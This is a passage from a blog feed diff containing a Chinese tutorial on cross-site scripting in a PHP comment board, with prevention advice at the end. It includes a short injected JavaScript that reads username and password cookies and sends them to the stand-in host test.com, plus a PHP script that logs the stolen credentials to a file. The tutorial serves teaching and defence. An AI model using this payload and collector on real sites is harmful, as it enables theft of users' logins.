class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;?php include(&apos;/components/headerinclude.php&apos;);?&gt;&lt;/head&gt;</div><div class="line">    &lt;style type=&quot;text/css&quot;&gt;</div><div class="line">        .comment-title&#123;</div><div class="line">            font-size:14px;</div><div class="line">            margin: 6px 0px 2px 4px;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        .comment-body&#123;</div><div class="line">            font-size: 14px;</div><div class="line">            color:#ccc;</div><div class="line">            font-style: italic;</div><div class="line">            border-bottom: dashed 1px #ccc;</div><div class="line">            margin: 4px;</div><div class="line">        &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;/js/cookies.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form method=&quot;post&quot; action=&quot;list.php&quot;&gt;</div><div class="line">        &lt;div style=&quot;margin:20px;&quot;&gt;</div><div class="line">            &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Your Comment&lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Nick Name:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;input name=&quot;name&quot; type=&quot;text&quot; style=&quot;width:300px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Comment:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;textarea name=&quot;comment&quot; style=&quot;height:100px; width:300px;&quot;&gt;&lt;/textarea&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding-left:230px;&quot;&gt;</div><div class="line">                &lt;input type=&quot;submit&quot; value=&quot;POST&quot; style=&quot;padding:4px 0px; width:80px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;border-bottom:solid 1px #fff;margin-top:10px;&quot;&gt;</div><div class="line">                &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Comments&lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;?php </div><div class="line">                require(&apos;/components/comments.php&apos;); </div><div class="line">                if(!empty($_POST[&apos;name&apos;]))&#123;</div><div class="line">                    addElement($_POST[&apos;name&apos;],$_POST[&apos;comment&apos;]);</div><div class="line">                &#125;</div><div class="line">                renderComments();</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>addElement()方法用于添加新的留言，而renderComments()方法用于展留言列表，网页看起来是这样的</p>
-<p><img src="/images/PHP漏洞分析-跨站脚本XSS-01.png" alt="Wb" title="PHP漏洞分析-跨站脚本XSS-01"></p>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>因为我们完全信任了用户输入，但有些别有用心的用户会像这样的输入</p>
-<p><img src="/images/PHP漏洞分析-跨站脚本XSS-02.png" alt="用户输入" title="PHP漏洞分析-跨站脚本XSS-02"></p>
-<p>这样无论是谁访问这个页面的时候控制台都会输出“Hey you are a fool fish!”，如果这只是个恶意的小玩笑，有些人做的事情就不可爱了，有些用户会利用这个漏洞窃取用户信息、诱骗人打开恶意网站或者下载恶意程序等，看个最简单的例子</p>
-<h3 id="利用xss窃取用户名密码"><a href="#利用xss窃取用户名密码" class="headerlink" title="利用xss窃取用户名密码"></a>利用xss窃取用户名密码</h3><p>当然这个示例很简单，几乎攻击不到任何网站，仅仅看看其原理。我们知道很多登陆界面都有记住用户名、密码的功能方便用户下次登录，有些网站是直接用明文记录用户名、密码，恶意用户注册账户登录后使用简单工具查看cookie结构名称后，如果网站有xss漏洞，那么简单的利用jsonp就可以获取其它用户的用户名、密码了。</p>
-<p>恶意用户会这么输入</p>
-<p><img src="/images/PHP漏洞分析-跨站脚本XSS-03.png" alt="恶意输入" title="PHP漏洞分析-跨站脚本XSS-03"></p>
-<p>我们看看<a href="http://test.com/hack.js里藏了什么" target="_blank" rel="external">http://test.com/hack.js里藏了什么</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var username=CookieHelper.getCookie(&apos;username&apos;).value;</div><div class="line">var password=CookieHelper.getCookie(&apos;password&apos;).value;</div><div class="line">var script =document.createElement(&apos;script&apos;);</div><div class="line">script.src=&apos;http://test.com/index.php?username=&apos;+username+&apos;&amp;password=&apos;+password;</div><div class="line">document.body.appendChild(script);</div></pre></td></tr></table></figure></p>
-<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向<a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
-<p>发送了一个get请求</p>
-<p><a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    if(!empty($_GET[&apos;password&apos;]))&#123;</div><div class="line">        $username=$_GET[&apos;username&apos;];</div><div class="line">        $password=$_GET[&apos;password&apos;];</div><div class="line">        </div><div class="line">        try&#123;</div><div class="line">            $path=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/password.txt&apos;;</div><div class="line">            $fp=fopen($path,&apos;a&apos;);</div><div class="line">            flock($fp, LOCK_EX);</div><div class="line">            fwrite($fp, &quot;$username\t $password\r\n&quot;);</div><div class="line">            flock($fp, LOCK_UN);</div><div class="line">            fclose($fp);</div><div class="line">        &#125;catch(Exception $e)&#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>这样恶意用户就把访问留言板的用户的信息窃取了</p>
-<h3 id="怎么预防"><a href="#怎么预防" class="headerlink" title="怎么预防"></a>怎么预防</h3><p>上面演示的是一个非常简单的XSS攻击，还有很多隐蔽的方式，但是其核心都是利用了脚本注入，因此我们解决办法其实很简单，不信赖用户输入，对特殊字符如”&lt;”,”&gt;”转义，就可以从根本上防止这一问题，当然很多解决方案都对XSS做了特定限制，如上面这中做法在ASP.NET中不幸不同，微软validateRequest对表单提交自动做了XSS验证。但防不胜防，总有些聪明的恶意用户会到我们的网站搞破坏，对自己站点不放心可以看看这个XSS跨站测试代码大全试试站点是否安全。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览
-    
-    </summary>
-    
-      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
-    
-    
-      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
     
   </entry>
   
